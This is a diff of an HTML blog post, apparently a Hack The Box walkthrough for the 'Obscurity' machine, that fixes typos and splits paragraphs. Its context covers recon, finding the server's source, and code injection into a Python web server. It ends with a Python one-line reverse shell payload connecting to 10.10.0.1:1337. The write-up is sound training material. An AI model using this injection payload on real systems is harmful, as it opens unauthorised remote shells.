@@ -236,7 +236,7 @@
 
 <p>A medium linux machine with some vulnerable <strong>Python</strong> scripts from <strong>HTB</strong> just retired with the following:</p>
 <ul>
-  <li>Missconfigured vulnerable <strong>Python</strong> web server to <strong>RCE</strong>.</li>
+  <li>Misconfigured vulnerable <strong>Python</strong> web server to <strong>RCE</strong>.</li>
   <li>Weak encryption algorithm to sign two messages, some text and the user password file.</li>
   <li>Vulnerable script to get the root password hash from the <strong>shadow</strong> file.</li>
 </ul>
@@ -336,7 +336,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p>As we see there are 4 ports two of them are open <code class="highlighter-rouge">22</code> running <strong>OpenSSH 7.6p1</strong> and it tells us the OS version is <strong>Ubuntu</strong>, and <code class="highlighter-rouge">8080</code> running a http-proxy called <strong>BadHTTPServer</strong> with some successful request headers, so let’s jumb into the browser to see what is it.</p>
 
-<h3 id="2-web-reconnaissance">2. Web Reconnaissance</h3>
+<h3 id="2-web-recon">2. Web Recon</h3>
 
 <p><a href="/assets/documentation/hack-the-box/obscurity/web_page-3757bc5ad5c1587903adfcf2fe941dee53c8303e62014428ebd460272844e1d4.png">
   <img src="/assets/documentation/hack-the-box/obscurity/web_page-3757bc5ad5c1587903adfcf2fe941dee53c8303e62014428ebd460272844e1d4.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/web_page-3757bc5ad5c1587903adfcf2fe941dee53c8303e62014428ebd460272844e1d4.png" data-zooming-width="1920" data-zooming-height="1051" />
@@ -348,8 +348,9 @@ Service detection performed. Please report any incorrect results at https://nmap
   <img src="/assets/documentation/hack-the-box/obscurity/web_page2-a015bbb181fdc18c9942415adad90ae9c663f3d7036683d613fcce41bd3edb0e.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/web_page2-a015bbb181fdc18c9942415adad90ae9c663f3d7036683d613fcce41bd3edb0e.png" data-zooming-width="1920" data-zooming-height="1052" />
 </a></p>
 
-<p>The message tells us there is some secret development directory that contains the source code of the running server <code class="highlighter-rouge">SuperSecureServer.py</code>, so first thing came to my mind is to run any directory brutceforcing tools like <code class="highlighter-rouge">gobuster</code>.
-But this did not work, so I can remember from my experience in software development the main source code is usually in some sort of well known folders like <code class="highlighter-rouge">/src</code>, <code class="highlighter-rouge">/app</code>, <code class="highlighter-rouge">/bin</code> …etc and as we saw from the message above a lot of word <code class="highlighter-rouge">development</code>. I tried some of sub-words of that name with the file and it worked with <code class="highlighter-rouge">/develop/SuperSecureServer.py</code>.</p>
+<p>The message tells us there is some secret development directory that contains the source code of the running server <code class="highlighter-rouge">SuperSecureServer.py</code>, so first thing came to my mind is to run any directory brutceforcing tools like <code class="highlighter-rouge">gobuster</code>.</p>
+
+<p>But this did not work, so I can remember from my experience in software development the main source code is usually in some sort of well known folders like <code class="highlighter-rouge">/src</code>, <code class="highlighter-rouge">/app</code>, <code class="highlighter-rouge">/bin</code> …etc, and as we saw from the message above a lot of <code class="highlighter-rouge">development</code> word. I tried some of sub-words of that name with the file and it worked with <code class="highlighter-rouge">/develop/SuperSecureServer.py</code>.</p>
 
 <p><a href="/assets/documentation/hack-the-box/obscurity/secret_dir-ecd52cba3246d0f2f44adb85c936146ce29ce51b08aaa47934fb1449434b8926.png">
   <img src="/assets/documentation/hack-the-box/obscurity/secret_dir-ecd52cba3246d0f2f44adb85c936146ce29ce51b08aaa47934fb1449434b8926.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/secret_dir-ecd52cba3246d0f2f44adb85c936146ce29ce51b08aaa47934fb1449434b8926.png" data-zooming-width="1920" data-zooming-height="1050" />
@@ -559,7 +560,9 @@ Connection: {connectionType}
   <img src="/assets/documentation/hack-the-box/obscurity/local_exploit-a741be97d21af2cc2b40ab82d59deecca2009372717de91ac34bbf9f95a6fe0b.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/local_exploit-a741be97d21af2cc2b40ab82d59deecca2009372717de91ac34bbf9f95a6fe0b.png" data-zooming-width="1920" data-zooming-height="1053" />
 </a></p>
 
-<p>Oh! that’s cool it executed the <code class="highlighter-rouge">print(5+5)</code> and it prints <code class="highlighter-rouge">10</code> to the terminal. Now, let’s get some <strong>Python</strong> one line reverse shell, put it instead of <code class="highlighter-rouge">print</code>, and exploit the remote server. Here’s our payload:</p>
+<p>Oh! that’s cool it executed the <code class="highlighter-rouge">print(5+5)</code> and it prints <code class="highlighter-rouge">10</code> to the terminal. Now, let’s get some <strong>Python</strong> one line reverse shell, put it instead of <code class="highlighter-rouge">print</code>, and exploit the remote server.</p>
+
+<p>Here’s our payload:</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">';</span>import socket,subprocess,os<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.10.0.1"</span>,1337<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>,<span class="s2">"-i"</span><span class="o">])</span><span class="p">;</span><span class="c">#</span></code></pre></figure>
 
